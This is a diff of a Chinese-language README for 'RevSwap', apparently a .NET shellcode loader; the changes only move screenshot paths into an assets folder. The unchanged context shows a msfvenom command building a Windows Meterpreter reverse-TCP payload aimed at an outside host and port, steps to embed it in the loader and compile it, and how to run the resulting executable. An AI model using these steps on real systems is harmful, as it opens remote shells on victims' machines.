@@ -90,12 +90,12 @@ RevSwap 是一个轻量级 .NET 动态加载器，通过加密与特征码定位
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=17.17.17.17 LPORT=8738 -f csharp
    ```
 
-   ![image](../image-20260610175842-f0ofkwg.png)
+   ![image](../assets/image-20260610175842-f0ofkwg.png)
 
-   ![image](../image-20260610175915-srrihsf.png)
+   ![image](../assets/image-20260610175915-srrihsf.png)
 2. 将数组替换到对应 `.cs` 文件的 `enc` 变量中。
 
-   ![image](../image-20260610180009-oos7vfy.png)
+   ![image](../assets/image-20260610180009-oos7vfy.png)
 3. 使用 Visual Studio 开发者命令提示符编译（注意平台）：
 
    ```
@@ -117,7 +117,7 @@ RevSwap 是一个轻量级 .NET 动态加载器，通过加密与特征码定位
    met64_tcp.exe <ip> <port>
    ```
 
-   ![image](../image-20260610180411-p15jj01.png)
+   ![image](../assets/image-20260610180411-p15jj01.png)
 
 ### 直接下载release使用
 
